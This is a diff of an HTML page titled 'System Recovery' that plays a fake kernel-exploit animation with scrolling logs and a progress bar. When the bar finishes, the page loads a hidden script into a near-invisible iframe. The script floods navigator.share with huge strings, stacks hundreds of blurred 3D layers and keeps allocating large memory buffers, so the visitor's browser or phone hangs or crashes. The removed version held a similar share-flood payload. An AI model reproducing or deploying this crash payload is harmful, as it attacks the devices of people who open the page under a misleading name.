@@ -2,72 +2,182 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Exploiting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Recovery</title>
     <style>
-        body { font-family: -apple-system, sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; color: white; overflow: hidden; }
-        .main-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); border-radius: 38px; padding: 35px 25px; width: 85%; max-width: 360px; text-align: center; z-index: 10; position: relative; }
-        h1 { font-size: 1.7rem; text-transform: uppercase; margin: 0; }
-        .patient-msg { font-size: 11px; color: #32d74b; margin: 10px 0 20px; font-weight: bold; text-transform: uppercase; }
-        .progress-container { background: rgba(255, 255, 255, 0.1); height: 4px; border-radius: 10px; margin-bottom: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #fff; transition: width 0.05s linear; }
-        #console { background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 180px; font-family: 'SF Mono', monospace; font-size: 9px; color: #32d74b; text-align: left; overflow: hidden; }
-        #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #700; color: #fff; z-index: 9999; padding: 10px; font-size: 7px; word-break: break-all; }
-        .error-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; font-weight: 900; font-size: 25px; z-index: 10000; text-transform: uppercase; border: 4px solid #000; }
+        body {
+            background: #000;
+            color: #00ff00; /* Классический цвет консоли */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            text-align: left;
+        }
+
+        #ui-container {
+            width: 80%;
+            max-width: 400px;
+        }
+
+        #console {
+            height: 150px;
+            overflow: hidden;
+            font-size: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column-reverse;
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            opacity: 0.8;
+        }
+
+        #progress-container {
+            width: 100%;
+            height: 10px;
+            border: 1px solid #00ff00;
+            background: #000;
+            position: relative;
+        }
+
+        #progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #00ff00;
+            transition: width 0.1s linear;
+        }
+
+        #fatal-error {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 10px;
+            letter-spacing: 1px;
+        }
+
+        #respring-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            border: none;
+            opacity: 0.01; 
+            pointer-events: none;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            font-size: 10px;
+            color: #444;
+        }
     </style>
 </head>
 <body>
-    <div id="panic-screen"></div>
-    <div class="main-card">
-        <h1>Exploiting Kernel</h1>
-        <div class="patient-msg">Please be patient, do not close the browser</div>
-        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
+
+    <div id="ui-container">
         <div id="console"></div>
+        <div id="progress-container">
+            <div id="progress-bar"></div>
+        </div>
+        <p id="status-text" style="font-size: 14px; margin-top: 10px;">Initializing...</p>
     </div>
+
+    <div id="fatal-error">Fatal Error</div>
+
+    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
     <script>
-        const bar = document.getElementById('bar');
-        const consoleEl = document.getElementById('console');
-        const panicEl = document.getElementById('panic-screen');
-        let barW = 0;
+        const logs = [
+            "Connecting to kernel...",
+            "Checking filesystem...",
+            "Loading exploit: m_core_3...",
+            "Bypassing sandbox...",
+            "Escalating privileges...",
+            "Injecting payload...",
+            "Memory corruption initiated...",
+            "Clearing sys-logs...",
+            "Finalizing exploit..."
+        ];
 
-        // Скорость прогресс-бара
-        const interval = setInterval(() => {
-            barW += 5; // Очень быстро
-            bar.style.width = barW + "%";
-            if(barW >= 100) {
-                clearInterval(interval);
-                triggerPanic();
-            }
-        }, 50);
+        const consoleDiv = document.getElementById('console');
+        const progressBar = document.getElementById('progress-bar');
+        const statusText = document.getElementById('status-text');
+        const uiContainer = document.getElementById('ui-container');
+        const fatalError = document.getElementById('fatal-error');
+        const frame = document.getElementById('respring-iframe');
 
-        // Скорость текста
+        let progress = 0;
+        let logIndex = 0;
+
         function addLog() {
-            if(barW < 100) {
-                const div = document.createElement('div');
-                div.innerText = `> 0x${Math.random().toString(16).substr(2,8).toUpperCase()}: CRITICAL_DATA_INJECTED`;
-                consoleEl.appendChild(div);
-                consoleEl.scrollTop = consoleEl.scrollHeight;
-                setTimeout(addLog, 30);
+            if (logIndex < logs.length) {
+                const log = document.createElement('div');
+                log.className = 'log-entry';
+                log.innerText = `> ${logs[logIndex]}`;
+                consoleDiv.prepend(log);
+                logIndex++;
             }
         }
-        addLog();
 
-        function triggerPanic() {
-            panicEl.style.display = 'block';
-            setInterval(() => { panicEl.innerText += ` FATAL_ERROR_0x${Math.random().toString(16)} `; }, 10);
-            const overlay = document.createElement('div');
-            overlay.className = 'error-overlay';
-            overlay.innerText = "Kernel Panic!";
-            document.body.appendChild(overlay);
-            
-            // Код respring
-            setTimeout(() => {
-                const frame = document.createElement('iframe');
-                frame.style.display = 'none';
-                frame.srcdoc = "<script>setInterval(()=>navigator.share({title:'X'.repeat(1000000)}),1)<\/script>";
-                document.body.appendChild(frame);
-            }, 500);
+        function startRespring() {
+            const respringScript = `
+                <html>
+                <body style="margin:0; overflow:hidden;">
+                    <script>
+                        const container = document.createElement('div');
+                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                        document.body.appendChild(container);
+                        for (let i = 0; i < 500; i++) {
+                            let d = document.createElement('div');
+                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+                            container.appendChild(d);
+                        }
+                        setInterval(() => {
+                            try {
+                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                            } catch(e) {}
+                            let x = new Uint8Array(1024 * 1024 * 20);
+                            crypto.getRandomValues(x);
+                        }, 0);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            frame.srcdoc = respringScript;
         }
+
+        const interval = setInterval(() => {
+            progress += Math.random() * 2;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                
+                // Финальный переход
+                uiContainer.style.display = 'none';
+                fatalError.style.display = 'block';
+                
+                // Запуск твоего кода респринга
+                setTimeout(startRespring, 500);
+            }
+            
+            progressBar.style.width = progress + '%';
+            statusText.innerText = `Processing: ${Math.floor(progress)}%`;
+            
+            if (Math.random() > 0.8) addLog();
+        }, 100);
+
     </script>
+    <div class="footer">© 2026 neonmodder123 | MIT License</div>
 </body>
 </html>
